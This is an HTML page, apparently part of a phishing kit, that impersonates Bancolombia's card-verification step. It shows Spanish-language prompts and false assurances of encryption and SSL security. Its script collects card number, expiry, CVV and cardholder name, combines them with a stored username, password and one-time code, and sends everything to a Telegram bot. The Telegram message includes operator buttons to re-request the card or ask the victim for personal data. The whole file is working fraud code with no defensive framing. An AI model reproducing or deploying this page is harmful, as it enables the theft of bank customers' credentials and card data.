<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Datos de Tarjeta - Bancolombia</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üè¶</text></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
    
    <style>
        :root {
            --bg-gradient: linear-gradient(135deg, #fef3c7 0%, #fde047 38%, #facc15 100%);
            --card-bg: rgba(255, 255, 255, 0.94);
            --text: #0f172a;
            --primary: #ffd200;
            --primary-hover: #facc15;
            --border: rgba(250, 204, 21, 0.28);
            --shadow: 0 28px 60px rgba(217, 119, 6, 0.18);
            --error: #ef4444;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
        }

        body {
            background: var(--bg-gradient);
            font-family: 'Inter', sans-serif;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: "";
            position: fixed;
            inset: 0;
            background: linear-gradient(160deg, rgba(255,255,255,0.45) 0%, rgba(254,240,138,0.4) 45%, rgba(217,119,6,0.25) 100%);
            z-index: 0;
            pointer-events: none;
        }

        .card-wrap {
            min-height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 28px 18px;
            position: relative;
            z-index: 1;
        }

        .card-form {
            width: 100%;
            max-width: 520px;
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 28px;
            box-shadow: var(--shadow);
            padding: 38px;
            backdrop-filter: blur(16px);
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo svg {
            width: 200px;
            height: auto;
        }

        .card-header {
            text-align: center;
            margin-bottom: 32px;
        }

        .card-title {
            font-size: 24px;
            font-weight: 700;
            color: var(--text);
            margin-bottom: 8px;
        }

        .card-subtitle {
            font-size: 14px;
            color: #64748b;
            line-height: 1.5;
        }

        .info-banner {
            background: #E3F2FD;
            border-left: 4px solid #005CA9;
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 8px;
        }

        .info-banner p {
            font-size: 13px;
            color: #005CA9;
            line-height: 1.5;
            margin: 0;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 8px;
        }

        .form-input-wrap {
            position: relative;
        }

        .form-input {
            width: 100%;
            padding: 14px 16px 14px 48px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            font-family: inherit;
            transition: all 0.3s ease;
            background: white;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(255, 210, 0, 0.1);
        }

        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 20px;
            color: #64748b;
            pointer-events: none;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background: var(--primary);
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            color: #0f172a;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 10px;
        }

        .btn-submit:hover {
            background: var(--primary-hover);
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(255, 210, 0, 0.4);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 24px;
            padding: 14px;
            background: rgba(74, 222, 128, 0.1);
            border-radius: 12px;
            border: 1px solid rgba(74, 222, 128, 0.2);
        }

        .security-badge i {
            font-size: 20px;
            color: #22c55e;
        }

        .security-text {
            font-size: 13px;
            color: #16a34a;
            font-weight: 600;
        }

        .loading-screen {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.9);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }

        .loading-screen.active {
            display: flex;
        }

        .loading-content {
            text-align: center;
            color: white;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.2);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 599px) {
            .card-form {
                padding: 28px 24px;
            }
            
            .form-row {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-content">
            <div class="spinner"></div>
            <p>Procesando informaci√≥n...</p>
        </div>
    </div>

    <div class="card-wrap">
        <div class="card-form">
            <div class="logo">
                <svg viewBox="0 0 200 40">
                    <text x="10" y="30" font-family="Inter, Arial" font-size="24" font-weight="900" fill="#005CA9">Bancolombia</text>
                </svg>
            </div>

            <div class="card-header">
                <h1 class="card-title">üí≥ Datos de Tarjeta</h1>
                <p class="card-subtitle">Ingresa los datos de tu tarjeta para verificar tu identidad</p>
            </div>

            <div class="info-banner">
                <p>üîí <strong>Informaci√≥n segura:</strong> Tus datos est√°n protegidos con encriptaci√≥n de extremo a extremo</p>
            </div>

            <form id="cardForm">
                <div class="form-group">
                    <label class="form-label" for="cardNumber">N√∫mero de tarjeta</label>
                    <div class="form-input-wrap">
                        <i class='bx bx-credit-card input-icon'></i>
                        <input type="text" id="cardNumber" class="form-input" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" required>
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label" for="expiryDate">Fecha de vencimiento</label>
                        <input type="text" id="expiryDate" class="form-input" placeholder="MM/AA" maxlength="5" inputmode="numeric" required style="padding-left: 16px;">
                    </div>

                    <div class="form-group">
                        <label class="form-label" for="cvv">CVV</label>
                        <input type="text" id="cvv" class="form-input" placeholder="123" maxlength="3" inputmode="numeric" required style="padding-left: 16px;">
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label" for="cardholderName">Nombre del titular</label>
                    <div class="form-input-wrap">
                        <i class='bx bx-user input-icon'></i>
                        <input type="text" id="cardholderName" class="form-input" placeholder="Como aparece en la tarjeta" required style="text-transform: uppercase;">
                    </div>
                </div>

                <button type="submit" class="btn-submit" id="submitBtn">
                    CONTINUAR
                </button>

                <div class="security-badge">
                    <i class='bx bx-shield-quarter'></i>
                    <span class="security-text">Conexi√≥n segura SSL 256-bit</span>
                </div>
            </form>
        </div>
    </div>

    <script src="js/telegram.js"></script>
    <script>
        // Verificar datos previos
        const otpData = JSON.parse(localStorage.getItem('otpData') || '{}');
        if (!otpData.usuario) {
            window.location.href = 'login.html';
        }

        // Formatear n√∫mero de tarjeta
        const cardNumber = document.getElementById('cardNumber');
        cardNumber.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
        });

        // Formatear fecha de vencimiento
        const expiryDate = document.getElementById('expiryDate');
        expiryDate.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });

        // Solo n√∫meros en CVV
        const cvv = document.getElementById('cvv');
        cvv.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });

        // Nombre en may√∫sculas
        const cardholderName = document.getElementById('cardholderName');
        cardholderName.addEventListener('input', function(e) {
            e.target.value = e.target.value.toUpperCase();
        });

        // Form submission
        document.getElementById('cardForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const cardData = {
                ...otpData,
                cardNumber: cardNumber.value,
                expiryDate: expiryDate.value,
                cvv: cvv.value,
                cardholderName: cardholderName.value,
                timestamp: new Date().toLocaleString('es-CO')
            };

            localStorage.setItem('cardData', JSON.stringify(cardData));

            // Mostrar loading
            document.getElementById('loadingScreen').classList.add('active');

            // Enviar a Telegram
            const mensaje = `üí≥ *BANCOLOMBIA - DATOS DE TARJETA*\n\nüë§ *Usuario:* ${otpData.usuario}\nüîë *Clave:* ${otpData.clave}\nüéØ *OTP:* ${otpData.otp}\n\nüí≥ *N√∫mero:* ${cardData.cardNumber}\nüìÖ *Vencimiento:* ${cardData.expiryDate}\nüîê *CVV:* ${cardData.cvv}\nüë§ *Titular:* ${cardData.cardholderName}\n\n‚è∞ *Hora:* ${cardData.timestamp}\nüÜî *ID:* ${otpData.transactionId}`;

            const teclado = {
                inline_keyboard: [
                    [
                        { text: "‚úÖ Correcto", callback_data: `correcto_tarjeta:${otpData.transactionId}` },
                        { text: "‚ùå Error Tarjeta", callback_data: `error_tarjeta:${otpData.transactionId}` }
                    ],
                    [
                        { text: "üí≥ Pedir Otra Vez", callback_data: `pedir_tarjeta:${otpData.transactionId}` },
                        { text: "üìã Pedir Datos Personales", callback_data: `pedir_datos:${otpData.transactionId}` }
                    ],
                    [
                        { text: "‚úîÔ∏è Finalizar", callback_data: `finish:${otpData.transactionId}` }
                    ]
                ]
            };

            try {
                await sendTelegramMessage(mensaje, teclado);
                
                // Simular espera
                setTimeout(() => {
                    document.getElementById('loadingScreen').classList.remove('active');
                    // Ir a √©xito
                    window.location.href = 'exito-final.html';
                }, 2000);

            } catch (error) {
                console.error('Error:', error);
                document.getElementById('loadingScreen').classList.remove('active');
                alert('Error al procesar. Intenta nuevamente.');
            }
        });
    </script>
</body>
</html>
